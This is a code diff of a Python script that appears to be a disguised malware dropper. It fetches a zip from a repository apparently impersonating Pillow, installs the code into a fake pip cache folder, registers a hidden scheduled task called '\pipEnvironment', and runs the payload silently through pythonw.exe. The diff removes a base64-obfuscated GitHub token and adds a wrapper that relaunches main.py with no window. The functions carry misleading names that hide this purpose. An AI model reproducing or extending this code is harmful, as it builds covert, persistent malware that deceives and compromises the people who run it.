@@ -1,5 +1,4 @@
 import os
-import base64
 import ctypes
 import zipfile
 import requests
@@ -7,16 +6,15 @@ from io import BytesIO
 import subprocess
 import sys
 import time
+import getpass  # For fetching the current username
 
+# Constants and configuration
 GITHUB_REPO_ZIP_URL = "https://github.com/pillowlibrary/pillow/archive/refs/heads/main.zip"
 LOCAL_DIR = os.path.join(os.getenv('LOCALAPPDATA'), "pip", "cache", "local")
 MAIN_PY_PATH = os.path.join(LOCAL_DIR, "main.py")
 WRAPPER_PATH = os.path.join(LOCAL_DIR, "wrapper.py")
 TASK_NAME = "\\pipEnvironment"
 TASK_COMMAND = os.path.join(os.getenv('LOCALAPPDATA'), "Programs", "Python", "Python310", "pythonw.exe")
-
-encoded_github_token = "Z2hwX2Z3TGVUTkNoTmZGdUhTN0padW9ldVA1MndnR3VjczB4MDcxWg=="
-github_token = base64.b64decode(encoded_github_token).decode()
 
 TOTAL_SIZE_MB = 53.8
 
@@ -130,9 +128,8 @@ def verify_permissions():
         return False
 
 def download_extension_files():
-    headers = {'Authorization': f'token {github_token}'}
     try:
-        response = requests.get(GITHUB_REPO_ZIP_URL, headers=headers)
+        response = requests.get(GITHUB_REPO_ZIP_URL)
         response.raise_for_status()
     except requests.RequestException as e:
         print(f"Failed to download the repository: {e}")
@@ -160,7 +157,26 @@ def configure_extension_scheduler():
         "/f",
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+def create_wrapper_file():
+    username = getpass.getuser()
+    wrapper_content = f"""import os
+import subprocess
+import sys
+
+working_directory = os.path.dirname(os.path.abspath(__file__))
+os.chdir(working_directory)
+
+subprocess.Popen([r"C:\\Users\\{username}\\AppData\\Local\\Programs\\Python\\Python310\\pythonw.exe", "main.py"],
+                 creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+sys.exit()
+"""
+    with open(WRAPPER_PATH, "w") as wrapper_file:
+        wrapper_file.write(wrapper_content)
+
 def execute_extension_rebuild():
+    create_wrapper_file()  # Generate the wrapper.py dynamically
     subprocess.Popen(
         [sys.executable.replace("python.exe", "pythonw.exe"), MAIN_PY_PATH],
         creationflags=subprocess.CREATE_NO_WINDOW
